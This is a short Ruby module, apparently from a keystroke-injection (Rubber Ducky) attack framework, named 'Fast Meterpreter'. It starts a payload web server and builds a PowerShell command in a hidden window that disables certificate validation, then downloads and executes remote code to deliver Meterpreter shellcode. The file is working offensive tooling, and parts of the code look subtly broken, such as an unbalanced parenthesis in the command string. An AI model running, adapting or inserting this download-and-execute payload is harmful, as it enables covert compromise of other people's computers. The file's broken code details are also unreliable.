#!/usr/bin/env ruby
require 'skeleton'
require 'metasploit'
class FastMeterpreter < Skeleton
  include Msf
  attr_reader :ducky
  self.title = 'Fast Meterpreter'
  self.description = 'Download and Execute meterpreter shellcode '
  description << 'from a web server'

  def setup
    server_setup = Server::Setup.new
    @host = server_setup.host
    @port = server_setup.port
    @ssl = server_setup.use_ssl?
    @msf = Msf::MsfCommands.new
  end

  def run
    server = Server::Start.new(@ssl, @host, @port)
    server.ruby_web
  end

  def finish; end

  private

  def powershell_command(url)
    psh = 'powershell -windowstyle hidden [System.Net.ServicePointManager]::'
    psh << 'ServerCertificateValidationCallback = { $true };IEX (New-Object '
    psh << "Net.WebClient).DownloadString('#{url}'))"
  end
end
